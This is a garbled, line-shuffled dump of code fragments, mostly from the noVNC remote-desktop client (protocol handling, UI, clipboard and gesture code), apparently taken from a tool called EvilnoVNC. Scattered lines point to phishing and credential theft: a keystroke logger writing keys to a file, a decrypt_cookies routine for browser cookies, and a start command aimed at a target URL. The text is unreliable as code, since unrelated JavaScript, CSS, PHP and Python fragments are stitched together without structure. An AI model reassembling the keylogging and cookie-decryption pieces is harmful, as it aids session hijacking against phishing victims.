    
     
      
       
        
         
            
             
              
                
                     
                      
                                
                                                     
                                                                                                                       
                                                                                                                                                    
                                                                                                                                                                   
                                                                                                                                                                            
                                                                                                                                                                              
                                                                                                                                                                                                        
                                                                                                                                                                                                              
                                                                                                                                                                                                                 
                                                                                                                                                                                                                  
                                                                                                                                                                                                                    
                                                                                                                                                                                                                     
                                                                                                                                                                                                                            
                                                                                                                                                                                                                               
                                                                                                                                                                                                                                               
                                                                 ev.detail.magnitudeY)
                                                              formats)
                                                           formats))
                                                   event.clientY)
                                           Math.abs(deltaY) > dragThreshold)) {
                                           { detail: this._clippingViewport }))
                                           { detail: { capabilities: this._capabilities } }))
                                        // (even if they are happy)
                                      size.h < this._display.height)
                                      this._canvas)
                                      this._fbDepth)
                                    (code === 'ShiftRight'))) {
                                    { clean: this._rfbCleanDisconnect } }))
                                  (w 
                                  this._canvas)
                                  this._rfbAuthScheme 
                                  this._rfbInitState 
                                (text.length 
                                (text.length >>  8) 
                                (text.length >> 16) 
                                this._gestureLastMagnitudeX 
                                this._gestureLastMagnitudeX -= GESTURE_ZOOMSENS
                               PIXEL_MASK) {
                              'error')
                              this._securityContext 
                              this._securityContext)
                            KeyTable.XK_Romaji ]
                            Preamble
                            reason: reason } }))
                            textData = chunk
                            this._gestureLastMagnitudeX 
                            this._gestureLastMagnitudeX -= GESTURE_SCRLSENS
                            this._gestureLastMagnitudeY 
                            this._gestureLastMagnitudeY -= GESTURE_SCRLSENS
                            this._handleMessage()
                            while ((magnitude -  this._gestureLastMagnitudeX) < -GESTURE_ZOOMSENS) {
                            while ((magnitude - this._gestureLastMagnitudeX) > GESTURE_ZOOMSENS) {
                            }
                           PIXEL_MASK) {
                           credentials: { password: password } })
                           msg)
                        // Always scroll in the same position.
                        // Ignore when the browser doesn't let us play audio.
                        // It is common that the browsers require audio to be
                        // Resume processing
                        // We don't know if the mouse was moved so we need to move it
                        // every update.
                        // ignore the size
                        // initiated from a user action.
                        //Fully opaque instead.
                        //Transparent pixel
                        //Unhandled xorMask
                        Enable JavaScript and cookies to continue
                        break
                        children[j].label = labels[i]
                        foreach($state as $s) {
                        if (Math.abs(magnitude - this._gestureLastMagnitudeX) > GESTURE_ZOOMSENS) {
                        if (format === extendedClipboardFormatText) {
                        let chunk = streamInflator.inflate(size)
                        let size = 0x00
                        let sizeArray = streamInflator.inflate(4)
                        return true
                        rgba[(pixel 
                        size 
                        this._clipboardServerCapabilitiesFormats[index] = true
                        this._fail(e.message)
                        this._flushing = false
                        this._gestureLastMagnitudeX = ev.detail.magnitudeX
                        this._gestureLastMagnitudeY = ev.detail.magnitudeY
                        this._mouseButtonMask)
                        this._rfbAuthScheme = securityTypeUnixLogon
                        this._rfbAuthScheme = securityTypeVNCAuth
                        this._rfbInitState = 'SecurityResult'
                        this._sock.rQshift32()
                        tmpText 
                        while ((ev.detail.magnitudeX - this._gestureLastMagnitudeX) < -GESTURE_SCRLSENS) {
                        while ((ev.detail.magnitudeX - this._gestureLastMagnitudeX) > GESTURE_SCRLSENS) {
                        while ((ev.detail.magnitudeY - this._gestureLastMagnitudeY) < -GESTURE_SCRLSENS) {
                        while ((ev.detail.magnitudeY - this._gestureLastMagnitudeY) > GESTURE_SCRLSENS) {
                        { detail: { text: textData } }))
                        }
                       TERMS AND CONDITIONS
                       this._FBU.encoding 
                       this._rfbConnectionState)
                     END OF TERMS AND CONDITIONS
                    .concat(Array.from(document.getElementsByClassName('noVNC_version_separator')))
                    .forEach(el => el.style.display = 'none')
                    .then(() => {
                    // Check if format flag is set.
                    // FIXME: We need to send a framebufferupdaterequest here
                    // if we add support for turning off continuous updates
                    //Fully opaque pixel
                    //Unhandled andMask
                    </span>
                    GNU GENERAL PUBLIC LICENSE
                    break
                    capabilities set as a response 
                    case 'STDVNOAUTH__':  // no auth
                    case 'STDVVNCAUTH_':
                    case 'TGHTULGNAUTH':
                    case 'drag':
                    case 'longpress':
                    case 'onetap':
                    case 'pinch':
                    case 'threetap':
                    case 'twodrag':
                    case 'twotap':
                    code = 0x3f
                    continue
                    ctrl.selectedIndex = i
                    default:
                    extendedClipboardActionProvide
                    for (let i = 0
                    if (!this._initMsg()) {
                    if (!this._normalMsg()) {
                    if ((formats 
                    if ((textData.length > 0) 
                    if (children[j].form !== undefined) {
                    if (formats 
                    if (this._clipboardText != null) {
                    if (this._flushing) {
                    if (xorMask[pixel] == 0) {
                    keysym = KeyTable.XK_Alt_L
                    keysym = KeyTable.XK_ISO_Level3_Shift
                    keysym = KeyTable.XK_Mode_switch
                    keysym = KeyTable.XK_Super_L
                    let b   = bgr >> 24 
                    let bgr = xorMask[pixel]
                    let format = 1 << i
                    let g   = bgr >> 16 
                    let index = 1 << i
                    let r   = bgr >> 8  
                    return
                    return true
                    rgba[(pixel 
                    textData = decodeUTF8(textData)
                    textData = tmpText
                    this._clipboardServerCapabilitiesActions[extendedClipboardActionProvide]) {
                    this._clipboardServerCapabilitiesActions[index] = !!(actions 
                    this._enabledContinuousUpdates = true
                    this._handleDelayedMouseMove()
                    this._rfbAuthScheme = type
                    this._rfbInitState = 'ClientInitialisation'
                    this._rfbInitState = 'SecurityResult'
                    this._rfbRSAAESAuthenticationState = null
                    this._rfbRSAAESAuthenticationState.removeEventListener(
                    this._updateConnectionState('disconnected')
                    this._updateContinuousUpdates()
                    this.dispatchEvent(new CustomEvent(
                    { detail: { status: status } }))
                    { detail: {} }))
                    }
                    } else if ((xorMask[pixel] 
                    } else {
                    })
                   controlbarBounds.height - handleHeight - margin) {
                   size.w 
                  // height
                  // width
                  // x-position
                  // y-position
                ((e.timeStamp - this._altGrCtrlTime) < 50)) {
                (controlbarBounds.height - handleHeight) / 2
                ./server.sh 
                .catch((e) => {
                .classList.add('noVNC_hidden')
                .classList.remove('noVNC_hidden')
                .instances { float: left
                .then(() => {
                /
                //        browsers detect this for us though and set the
                //        does however happily send real Ctrl events
                //        even when AltGr is already down. Some
                //        first manually pressed as Windows then no
                //        happen without a bug messing up our state variables
                //        longer sends the fake Ctrl down event. It
                // Avoid getting in to a loop
                // Check if server has told us it can handle Provide and there is clipboard data to send.
                // FIXME: Should probably verify that this data was actually requested
                // FIXME: We fail to detect this if either Ctrl key is
                // Handle disconnects that were initiated server-side
                // If it's a virtual keyboard then it should be
                // If we actually performed a drag then we are done
                // Ignore what we had in our clipboard client side.
                // Normal disconnection path
                // Otherwise we treat this as a mouse click event.
                // Refresh the target from elementFromPoint since queued events
                // Skip sending mouse events
                // Some cases where the initial connection fails
                // Update our server capabilities for Actions
                // Update our server capabilities for Formats
                // We might have detached at this point
                // after each other
                // can disconnect before the _screen is created
                // event is sent at the end of this function.
                // here and should not send any mouse events
                // might have altered the DOM
                // sufficient to just send press and release right
                </div>
                Array.from(document.getElementsByClassName('noVNC_version')).forEach(el => el.innerText = packageInfo.version)
                Array.from(document.getElementsByClassName('noVNC_version_wrapper'))
                UI.toggleControlbarSide()
                ]
                andMask[pixel] = this._sock.rQshift32()
                background-color: 
                backspaces = oldLen - i
                break
                case 'email':
                case 'password':
                case 'search':
                case 'select-multiple':
                case 'select-one':
                case 'tel':
                case 'text':
                case 'textarea':
                case 'url':
                case 1:
                case 2:
                case 3:
                case KeyTable.XK_Alt_L:
                case KeyTable.XK_Alt_R:
                case KeyTable.XK_Super_L:
                case KeyTable.XK_Super_R:
                const children = labels[i].children
                const elem = document.getElementById(htmlFor)
                controlbarBounds.height - handleHeight - margin
                dataToDeflate.push(text.charCodeAt(j))
                data[i
                default:
                document.body.msRequestFullscreen()
                document.documentElement.mozRequestFullScreen()
                document.documentElement.requestFullscreen()
                document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)
                document.exitFullscreen()
                document.mozCancelFullScreen()
                document.msExitFullscreen()
                document.webkitExitFullscreen()
                e.detail.reason
                first = !this._supportsContinuousUpdates
                font-size: 80%
                for (let i = 0
                for (let i = 24
                for (let j = 0
                if (!(formats 
                if (!response.ok) {
                if (!this._target) {
                if (andMask[pixel] == 0) {
                if (code > 0xff) {
                if (ctrl.options[i].value === value) {
                if (elem) elem.label = labels[i]
                if (first) {
                if (oldstate !== '') {
                if (oldstate !== 'connected' 
                if (oldstate !== 'connecting') {
                if (oldstate !== 'disconnecting') {
                if (ret 
                if (textData !== null) {
                if (this._clipboardServerCapabilitiesActions[extendedClipboardActionNotify]) {
                if (this._clipboardServerCapabilitiesActions[extendedClipboardActionRequest]) {
                if (this._clipboardText != null 
                if (this._isSupportedSecurityType(type)) {
                if (this._rfbVersion >= 3.8) {
                if (this._viewOnly) {
                if (this._viewportHasMoved) {
                if (type === securityTypeVeNCrypt) {
                if(is_array($state)) {
                inputs = newLen - i
                isRepeater = 1
                keysym = KeyTable.XK_ISO_Level3_Shift
                length
                let alpha = (mask[maskIdx] << (x % 8)) 
                let clientActions = [
                let code = codePoint.codePointAt(0)
                let data = this._sock.rQshift32()
                let maskIdx = y 
                let streamInflator = new Inflator()
                let textData = null
                let zlibStream = this._sock.rQshiftBytes(length - 4)
                msg 
                overflow-y: scroll
                padding: 4px
                pixIdx 
                port = 443
                port = 80
                position: sticky
                promise.catch((e) => {
                repeaterID 
                ret = this._framebufferUpdate()
                return
                return 'Platform' 
                return UI.start()
                return e.keyIdentifier
                return false
                return lowerByte 
                return response.json()
                return ret
                return this._handleCursor()
                return this._handleDataRect()
                return this._handleDesktopName()
                return this._handleExtendedDesktopSize()
                return this._handleSecurityReason()
                return this._handleSecurityResult()
                return this._handleServerCutText()
                return this._handleServerFenceMsg()
                return this._handleSetColourMapMsg()
                return this._handleVMwareCursor()
                return this._handleXvpMsg()
                return this._negotiateARDAuth()
                return this._negotiateAuthentication()
                return this._negotiateMSLogonIIAuth()
                return this._negotiatePlainAuth()
                return this._negotiateProtocolVersion()
                return this._negotiateRA2neAuth()
                return this._negotiateSecurity()
                return this._negotiateServerInit()
                return this._negotiateStdVNCAuth()
                return this._negotiateTightAuth()
                return this._negotiateTightUnixAuth()
                return this._negotiateVeNCryptAuth()
                return this._negotiateXvpAuth()
                return true
                rgba[(pixel 
                rgba[pixIdx 
                rgba[pixIdx    ] = pixels[pixIdx 
                serverSupportedTunnelTypes[0].signature != clientSupportedTunnelTypes[0].signature) {
                setCapture(this._canvas)
                statusType === 'normal') {
                streamInflator.setInput(null)
                streamInflator.setInput(zlibStream)
                subtypes.push(this._sock.rQshift32())
                switch (authType) {
                switch (ev.detail.type) {
                text-align: left
                this._FBU.encoding = this._sock.rQshift32()
                this._FBU.encoding >>= 0
                this._FBU.height = this._sock.rQshift16()
                this._FBU.rects = 1
                this._FBU.width = this._sock.rQshift16()
                this._FBU.x = this._sock.rQshift16()
                this._FBU.y = this._sock.rQshift16()
                this._clipboardServerCapabilitiesActions = {}
                this._clipboardServerCapabilitiesFormats = {}
                this._clipboardText = null
                this._connect()
                this._disconnTimer = setTimeout(() => {
                this._disconnect()
                this._display.flush()
                this._enabledContinuousUpdates = false
                this._flushing = true
                this._gestureFirstDoubleTapEv = ev
                this._keyboard.grab()
                this._keyboard.ungrab()
                this._mouseLastMoveTime = Date.now()
                this._mouseMoveTimer = setTimeout(() => {
                this._negotiateTightTunnels(numTunnels)
                this._qemuExtKeyEventSupported = true
                this._rfbInitState = 'ServerInitialisation'
                this._rfbVersion = 3.3
                this._rfbVersion = 3.7
                this._rfbVersion = 3.8
                this._rfbXvpVer = xvpVer
                this._screenFlags = this._sock.rQshift32()
                this._screenID = this._sock.rQshift32()
                this._securityStatus = 1
                this._securityStatus = status
                this._sock.flush()
                this._sock.rQskipBytes(16)
                this._sock.rQskipBytes(2)
                this._sock.sQpush32(clientSupportedTypes[authType])
                this._sock.sQpush8(this._shared 
                this._socketOpen()
                this._supportsContinuousUpdates = true
                this._updateConnectionState('disconnected')
                this._updateConnectionState('disconnecting')
                this._updateVisibility(target)
                this._viewportDragging = false
                this._viewportDragging = true
                this._viewportHasMoved = false
                this._viewportHasMoved = true
                this.dispatchEvent(new CustomEvent(
                throw e
                val = false
                val = true
                while (this._rfbConnectionState === 'connecting') {
                while (true) {
                width: 100%
                xorMask[pixel] = this._sock.rQshift32()
                { detail: { status: this._securityStatus } }))
                { detail: { text: text } }))
                }
                } else if ((andMask[pixel] 
                } else {
                })
                }).finally(() => {
              // Websock object
             // Reserved
             document.body.msRequestFullscreen)) {
             document.documentElement.mozRequestFullScreen 
             document.documentElement.webkitRequestFullscreen 
            !UI.rfb.viewOnly) {
            !this._supportsSetDesktopSize) {
            'TGHTULGNAUTH': 129
            ((Date.now() - this._gestureLastTapTime) < DOUBLE_TAP_TIMEOUT) 
            (document.documentElement.requestFullscreen 
            (e.metaKey 
            (this._gestureFirstDoubleTapEv.detail.type === ev.detail.type)) {
            (this._rfbInitState === '')) {
            .catch((err) => {
            .classList.add('noVNC_open')
            .classList.remove('noVNC_open')
            .contains(document.activeElement) 
            .getBoundingClientRect()
            .then((packageInfo) => {
            .then((response) => {
            /
            // 0 is NoSymbol
            // 229 is used for composition events
            // Can't be clipping if viewport is scaled to fit
            // Change lone 
            // Check if it already has 
            // Close power panel if open
            // Disable viewport clipping if we are scaling
            // Do we really think this key is down
            // FIXME: This gets hidden when connecting
            // Force coordinates to be above the bottom of the control bar
            // Force coordinates to be below the top of the control bar
            // Hide the controlbar after 2 seconds
            // In order to not send multiple requests before the browser-resize
            // Look for a matching security type in the order that the
            // Make sure the previous frame is fully rendered first
            // Move the caret to the end
            // Non-character key
            // Remove the address bar
            // Request changing the resolution of the remote display to
            // Save the id and flags of the first screen
            // Server decides
            // Show the connect panel on first load unless autoconnecting
            // Skip sending mouse events
            // Some platforms have scrollbars that are difficult
            // TIGHT client message capabilities
            // TIGHT encoding capabilities
            // TIGHT server message capabilities
            // The same fingerprint format as RealVNC
            // The standards disagree on the return value here
            // The y-position indicates the status code from the server
            // There always have to be some text in the keyboardinput
            // This has to be ran outside of the input handler in order to work
            // This sometimes causes the keyboard to disappear for a second
            // Try to check caret position since whitespace at the end
            // We are no longer clipping the viewport. Make sure
            // We only support the format Text at this time
            // but it is required for the android keyboard to recognize that
            // element with which backspace can interact.
            // eslint-disable-next-line no-unused-vars
            // if the async web crypto is done return the results
            // is finished we wait 0.5 seconds before sending the request.
            // make sure we don't get a double event
            // selectionStart is undefined in Google Chrome
            // server prefers
            // setSelectionRange is undefined in Google Chrome
            // so we just skip the all of this.
            // text has been added to the field
            // the size of the container.
            // the size of the local browser viewport.
            // to avoid building up an excessive queue
            // viewport drag isn't active when it can't be used.
            // will not be considered by value.length in some browsers
            //Extended msg.
            //OR is used for correct conversion in js.
            //Standard msg
            //Used to filter away unimportant bits.
            </div>
            EvilnoVNC () { 
            How to Apply These Terms to Your New Programs
            Log.Debug('Authentication OK')
            Log.Info(
            UI.activateControlbar()
            UI.addFullscreenHandlers()
            UI.closeClipboardPanel()
            UI.closeControlbar()
            UI.closeExtraKeys()
            UI.closePowerPanel()
            UI.closeSettingsPanel()
            UI.connect()
            UI.controlbarDrag = true
            UI.disableSetting('encrypt')
            UI.disableSetting('host')
            UI.disableSetting('path')
            UI.disableSetting('port')
            UI.disableSetting('repeaterID')
            UI.disableSetting('shared')
            UI.enableSetting('encrypt')
            UI.enableSetting('host')
            UI.enableSetting('path')
            UI.enableSetting('port')
            UI.enableSetting('repeaterID')
            UI.enableSetting('shared')
            UI.enableSetting('view_clip')
            UI.hideVirtualKeyboard()
            UI.keepControlbar()
            UI.keyboardinputReset()
            UI.lastKeyboardinput = newValue
            UI.openClipboardPanel()
            UI.openConnectPanel()
            UI.openControlbar()
            UI.openExtraKeys()
            UI.openPowerPanel()
            UI.openSettingsPanel()
            UI.reconnectCallback = null
            UI.reconnectPassword = password
            UI.rfb.capabilities.power 
            UI.rfb.clipViewport  = false
            UI.rfb.clipViewport = UI.getSetting('view_clip')
            UI.rfb.clipViewport = true
            UI.rfb.dragViewport = false
            UI.rfb.focus()
            UI.rfb.focusOnClick = false
            UI.rfb.focusOnClick = true
            UI.rfb.sendKey(keysyms.lookup(newValue.charCodeAt(i)))
            UI.showVirtualKeyboard()
            UI.toggleControlbar()
            UI.toggleControlbarSide()
            UI.updatePowerButton()
            UI.updateViewClip()
            UI.updateVisualState('disconnected')
            UI.updateVisualState('reconnecting')
            actionFlag 
            autoconnect = false
            autoconnect = true
            background-color: white
            bar.style.transitionDuration = '0s'
            bpp = 16
            bpp = 32
            bpp = 8
            case 'Authentication':
            case 'ClientInitialisation':
            case 'ProtocolVersion':
            case 'Security':
            case 'SecurityReason':
            case 'SecurityResult':
            case 'ServerInitialisation':
            case 'connected':
            case 'connecting':
            case 'disconnected':
            case 'disconnecting':
            case 'error':
            case 'gestureend':
            case 'gesturemove':
            case 'gesturestart':
            case 'info':
            case 'init':
            case 'mousedown':
            case 'mousemove':
            case 'mouseup':
            case 'normal':
            case 'reconnecting':
            case 'warn':
            case 'warning':
            case 0:  // FramebufferUpdate
            case 0:  // XVP_FAIL
            case 150: // EndOfContinuousUpdates
            case 1:  // SetColorMapEntries
            case 1:  // XVP_INIT
            case 248: // ServerFence
            case 250:  // XVP
            case 2:  // Bell
            case 3:  // ServerCutText
            case encodings.pseudoEncodingCursor:
            case encodings.pseudoEncodingDesktopName:
            case encodings.pseudoEncodingDesktopSize:
            case encodings.pseudoEncodingExtendedDesktopSize:
            case encodings.pseudoEncodingLastRect:
            case encodings.pseudoEncodingQEMUExtendedKeyEvent:
            case encodings.pseudoEncodingVMwareCursor:
            case securityTypeARD:
            case securityTypeMSLogonII:
            case securityTypeNone:
            case securityTypePlain:
            case securityTypeRA2ne:
            case securityTypeTight:
            case securityTypeUnixLogon:
            case securityTypeVNCAuth:
            case securityTypeVeNCrypt:
            case securityTypeXVP:
            changeFunc = () => UI.saveSetting(name)
            clearTimeout(UI.reconnectCallback)
            clearTimeout(this._altGrTimeout)
            clearTimeout(this._disconnTimer)
            clearTimeout(this._mouseMoveTimer)
            clearTimeout(this._resizeTimeout)
            const PIXEL_MASK = 0xffffff00 
            const capCode = this._sock.rQshift32()
            const capSignature = this._sock.rQshiftStr(8)
            const capVendor = this._sock.rQshiftStr(4)
            const capabilities = this._sock.rQshiftStr(12)
            const char = String.fromCharCode(codepoint).toUpperCase()
            const delay = parseInt(UI.getSetting('reconnect_delay'))
            const deltaX = this._viewportDragPos.x - x
            const deltaY = this._viewportDragPos.y - y
            const dragDistance = Math.abs(ptr.clientY - UI.controlbarMouseDownClientY)
            const flags = this._sock.rQshift32()
            const htmlFor = labels[i].htmlFor
            const l = input.value.length
            const lowerByte = (keycode 
            const major = this._sock.rQshift8()
            const minor = this._sock.rQshift8()
            const numClientMessages = this._sock.rQshift16()
            const numEncodings = this._sock.rQshift16()
            const numServerMessages = this._sock.rQshift16()
            const numTunnels = this._sock.rQshift32()
            const numTypes = this._sock.rQshift8()
            const promise = document.getElementById('noVNC_bell').play()
            const publickey = e.detail.publickey
            const res = this._sock.rQshift8()
            const size = this._screenSize()
            const subtypes = []
            const subtypesLength = this._sock.rQshift8()
            const text = this._sock.rQshiftStr(length)
            const timeSinceLastMove = Date.now() - this._mouseLastMoveTime
            const totalMessagesLength = (numServerMessages 
            const types = this._sock.rQshiftBytes(numTypes)
            const upperByte = (keycode >> 8)
            credentials[64 
            credentials[i] = username.charCodeAt(i)
            ctrl.checked = value
            ctrl.value = value
            currentHeight == this._expectedClientHeight
            dX 
            dY 
            data = new Uint8Array(length)
            dataToDeflate.push( (text.length >> 24) 
            data[3] 
            data[loopOffset 
            data[loopOffset]     = formats[formatKeys[i]] >> 24
            decrypted_value = decrypt_cookies(encrypted_value)
            decrypted_value = value
            default:
            delete this._keyDownList[code]
            display: flex
            document.body.appendChild(this._canvas)
            document.body.removeChild(this._canvas)
            document.documentElement.contains(document.captureElement)
            document.getElementById('noVNC_clipboard_button')
            document.getElementById('noVNC_fingerprint').innerHTML = fingerprint
            document.getElementById('noVNC_fullscreen_button')
            document.getElementById('noVNC_keyboard_button')
            document.getElementById('noVNC_keyboardinput').focus()
            document.getElementById('noVNC_power_button')
            document.getElementById('noVNC_toggle_extra_keys_button')
            document.getElementById('noVNC_verify_server_dlg').classList.add('noVNC_open')
            document.mozFullScreenElement 
            document.msFullscreenElement ) {
            document.msFullscreenElement) {
            document.webkitFullscreenElement 
            e.preventDefault()
            e.stopPropagation()
            encs.push(encodings.encodingHextile)
            encs.push(encodings.encodingJPEG)
            encs.push(encodings.encodingRRE)
            encs.push(encodings.encodingTight)
            encs.push(encodings.encodingTightPNG)
            encs.push(encodings.encodingZRLE)
            encs.push(encodings.pseudoEncodingCursor)
            encs.push(encodings.pseudoEncodingVMwareCursor)
            event.target.blur()
            f.write('
            f.write(' ')
            f.write('!')
            f.write('(')
            f.write(')')
            f.write('.')
            f.write(':')
            f.write('=')
            f.write('@')
            f.write('BACKSPACE')
            f.write('DELETE')
            f.write('{}'.format(event.Key))
            flex-direction: column
            for (let codePoint of text) {
            for (let i = 0
            for (let j = 0
            for (let pixel = 0
            for (let type of subtypes) {
            for (let type of types) {
            for (let x = 0
            formatFlag 
            height: 100%
            i = 0
            if (!(code in this._keyDownList)) {
            if (!(major == 0 
            if (!keysym) {
            if (!response.ok) {
            if (!this._handleRect()) {
            if ('ShiftLeft' in this._keyDownList) {
            if ('ShiftRight' in this._keyDownList) {
            if (distance < DOUBLE_TAP_THRESHOLD) {
            if (document.documentElement.requestFullscreen) {
            if (document.exitFullscreen) {
            if (down 
            if (dragDistance < dragThreshold) return
            if (e.keyCode !== 229) {
            if (e.name === 'NotFoundError') {
            if (e.reason) {
            if (ev.target !== this._canvas) {
            if (formats[i] != extendedClipboardFormatText) {
            if (htmlFor != '') {
            if (i === 0) {
            if (isCaps) {
            if (keysym) {
            if (newValue.charAt(i) != oldValue.charAt(i)) {
            if (numTunnels > 0 
            if (numTunnels > 0) {
            if (numTypes === 0) {
            if (promise) {
            if (res != 0) {
            if (serverSupportedTunnelTypes[0].vendor != clientSupportedTunnelTypes[0].vendor 
            if (serverSupportedTypes.indexOf(authType) != -1) {
            if (subtypesLength < 1) {
            if (this._FBU.encoding === null) {
            if (this._accumulatedWheelDeltaX < 0) {
            if (this._accumulatedWheelDeltaY < 0) {
            if (this._cursorImage.rgbaPixels[i]) {
            if (this._display.pending()) {
            if (this._rfbAuthScheme == 0) {
            if (this._rfbAuthScheme === -1) {
            if (this._rfbVersion >= 3.8) {
            if (this._sock.readyState === 'closed') {
            if (this._sock.readyState === 'open') {
            if (this._viewOnly) {
            if (this._viewportHasMoved 
            if (timeSinceLastMove > MOUSE_MOVE_DELAY) {
            if (upperByte === 0xe0 
            if (viewOnly) {
            if (wasConnected) {
            inData[i] = inData[i].replace(/
            keysym = keysym 
            keysym = this._keyDownList[code]
            length = 0
            length = 64
            length = Math.abs(length)
            length = data.length
            length = toUnsigned32bit(-data.length)
            let actions = flags 
            let andMask = new Array(w 
            let data
            let dx = this._gestureFirstDoubleTapEv.detail.clientX - ev.detail.clientX
            let dy = this._gestureFirstDoubleTapEv.detail.clientY - ev.detail.clientY
            let formats = flags 
            let isCaps = (!!(actions 
            let text = encodeUTF8(inData[i] 
            let xorMask = new Array(w 
            loopOffset 
            margin: 0
            msg 
            msgType = 0
            msgType = this._sock.rQshift8()
            newClip = false
            newLen = newValue.length
            newY = controlbarBounds.top 
            numlock = null
            pass
            password = WebUtil.getConfigVar('password')
            password = undefined
            passwordBytes[i] = password.charCodeAt(i)
            reason = this._sock.rQshiftStr(strlen)
            return
            return 'Platform' 
            return chromedate
            return code
            return false
            return response.json()
            return true
            return xtScanCode
            rgba = new Array(w 
            serverSupportedTypes.push(capabilities)
            setCapture(handle)
            sock.sQpush32(encodings[i])
            statusType = 'normal'
            stopEvent(e)
            switch (event.target.type) {
            switch (keysym) {
            switch (this._FBU.y) {
            target = document.captureElement
            this._FBU.encoding = null
            this._FBU.rects = this._sock.rQshift16()
            this._FBU.rects--
            this._accumulatedWheelDeltaX = 0
            this._accumulatedWheelDeltaY = 0
            this._altGrArmed = false
            this._altGrArmed = true
            this._altGrCtrlTime = e.timeStamp
            this._canvas.style.pointerEvents = 'none'
            this._canvas.style.position = 'fixed'
            this._canvas.style.visibility = ''
            this._canvas.style.visibility = 'hidden'
            this._canvas.style.zIndex = '65535'
            this._clipboardServerCapabilitiesActions[extendedClipboardActionNotify]) {
            this._clipboardText = text
            this._disconnTimer = null
            this._display = new Display(this._canvas)
            this._display.clipViewport = newClip
            this._display.scale = 1.0
            this._fbDepth = 8
            this._fixScrollbars()
            this._gestureFirstDoubleTapEv = ev
            this._hideCursor()
            this._keyDownList[code] = keysym
            this._mouseButtonMask 
            this._mouseMoveTimer = null
            this._position.x = clientX
            this._position.x = clientX 
            this._position.y = clientY
            this._position.y = clientY 
            this._rawChannel = urlOrChannel
            this._requestRemoteResize()
            this._rfbAuthScheme = -1
            this._rfbAuthScheme = this._sock.rQshift32()
            this._rfbCredentials.ardCredentials != undefined) {
            this._rfbCredentials.ardCredentials = null
            this._rfbCredentials.ardPublicKey = null
            this._rfbCredentials.password === undefined 
            this._rfbCredentials.password === undefined) {
            this._rfbCredentials.target === undefined) {
            this._rfbInitState = 'ClientInitialisation'
            this._rfbInitState = 'ProtocolVersion'
            this._rfbInitState = 'SecurityResult'
            this._rfbRSAAESAuthenticationState.addEventListener(
            this._rfbRSAAESAuthenticationState.approveServer()
            this._rfbRSAAESAuthenticationState.disconnect()
            this._rfbRSAAESAuthenticationState.negotiateRA2neAuthAsync()
            this._rfbTightVNC = true
            this._rfbVeNCryptState = 1
            this._rfbVeNCryptState = 2
            this._rfbVeNCryptState = 3
            this._rfbVeNCryptState = 4
            this._rfbVeNCryptSubtypesLength = subtypesLength
            this._rfbVersion = this._rfbMaxVersion
            this._saveExpectedClientSize()
            this._sendEncodings()
            this._setClippingViewport(false)
            this._setClippingViewport(size.w < this._display.width 
            this._showCursor()
            this._showDotCursor = options.showDotCursor
            this._sock.attach(this._rawChannel)
            this._sock.flush()
            this._sock.off('close')
            this._sock.rQshift32()
            this._sock.rQskipBytes(1)
            this._sock.rQskipBytes(16 
            this._sock.rQskipBytes(2)
            this._sock.sQpush32(0)
            this._sock.sQpush32(this._rfbAuthScheme)
            this._sock.sQpush8(0)
            this._sock.sQpush8(2)
            this._sock.sQpush8(this._rfbAuthScheme)
            this._sock.sQpushBytes(this._rfbCredentials.ardCredentials)
            this._sock.sQpushBytes(this._rfbCredentials.ardPublicKey)
            this._sock.sQpushString(repeaterID)
            this._target.removeChild(this._screen)
            this._updateClip()
            this._updateScale()
            this._url = null
            this._url = urlOrChannel
            this.clear()
            this.detach()
            this.dispatchEvent(new CustomEvent(
            throw exc
            time = 1500
            url 
            usernameBytes[i] = username.charCodeAt(i)
            val = ctrl.checked
            val = ctrl.options[ctrl.selectedIndex].value
            val = ctrl.value
            while (repeaterID.length < 250) {
            window.setTimeout(() => {
            { detail: { name: this._fbName } }))
            }
            } else if (actions === extendedClipboardActionNotify) {
            } else if (actions === extendedClipboardActionPeek) {
            } else if (actions === extendedClipboardActionProvide) {
            } else if (actions === extendedClipboardActionRequest) {
            } else if (document.body.msRequestFullscreen) {
            } else if (document.documentElement.mozRequestFullScreen) {
            } else if (document.documentElement.webkitRequestFullscreen) {
            } else if (document.mozCancelFullScreen) {
            } else if (document.msExitFullscreen) {
            } else if (document.webkitExitFullscreen) {
            } else if (this._accumulatedWheelDeltaX > 0) {
            } else if (this._accumulatedWheelDeltaY > 0) {
            } else {
            })
           // Display object
          // Gesture input handler object
          // Keyboard input handler object
          return origin
         // Display flushing state
         // List of depressed keys
        '
        )
        ./start.sh dynamic http://example.com
        .then((response) => {
        .then((translations) => { l10n.dictionary = translations
        .then(UI.prime)
        /
        //
        // 
        //                   
        //                   if we backtrack
        //        should we stop events
        // ===== EVENT HANDLERS =====
        // ===== PROPERTIES =====
        // A precursor to the final DOM3 standard. Unfortunately it
        // Adapt the interface for touch screen devices
        // Adjust the visible viewport based on the new dimensions
        // Always grab focus on some kind of click event
        // BlockBefore and BlockAfter are automatically handled by
        // Bootstrap fallback input handler
        // Bound event handlers
        // Build data  to send
        // Called when this._cursorImage is updated
        // Captures end with a mouseup but we can't know the event order of
        // Changing the viewport may change the state of
        // Check Query string followed by cookie
        // Check if the coordinates are outside the control bar
        // Check if we should show the cursor on the element we are leaving to
        // Clear the input after reading the password
        // Compare the old string with the new to account for
        // Connection details
        // Consider this a movement of the handle
        // Control the text content length in the keyboardinput element
        // Corner case: control bar too small for stable position
        // Create DOM elements
        // Cursor
        // Decode from BGRX pixels 
        // Decoder states
        // Deflate incomming data and their sizes
        // Delete reference to raw channel to allow cleanup.
        // Disable automatic reconnecting
        // Display the desktop name in the document title
        // Do this last because it can only be used on rendered elements
        // Don't change anything if the client size is already as expected
        // Don't display the connection settings until we're actually disconnected
        // Don't fade if a child of the control bar has focus
        // Don't overwrite more severe visible statuses and never
        // Easy case
        // Ensure proper transitions before doing anything
        // Error messages do not timeout
        // FIXME: How can we tell that a sub element has an
        // FIXME: handle more types
        // FIXME: support syncNext
        // Filter out unsupported flags
        // Flush waiting move event first
        // Force Safari to recalculate the layout by asking for
        // Generate a mouse wheel step event when the accumulated delta
        // Gesture events
        // Gesture state
        // Has the child its own cursor
        // Hide input related buttons in view only mode
        // If reconnecting is allowed process it now
        // If the user quickly taps multiple times we assume they meant to
        // If the window resized then our screen element might have
        // Ignore when rfb already exists
        // In preference order
        // In this case we focus our special virtual keyboard input
        // Internal objects
        // Internal state
        // Is this key already pressed
        // Japanese IM keys so we have to fake the release right away
        // Keep this size until browser client size changes
        // Limit many mouse move events to one every MOUSE_MOVE_DELAY ms
        // Logging selection dropdown
        // Make our elements part of the page
        // Monitor size changes of the screen element
        // Mouse events
